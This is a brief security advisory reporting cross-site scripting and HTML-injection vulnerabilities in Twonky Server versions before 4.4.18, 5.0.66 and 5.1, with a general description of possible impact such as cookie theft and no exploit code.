Twonky Server is prone to a cross-site scripting vulnerability and multiple HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in dynamically generated content.

Attacker-supplied HTML and script code could run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user. Other attacks are also possible.

Versions prior to Twonky Server 4.4.18, 5.0.66, and 5.1 are vulnerable.
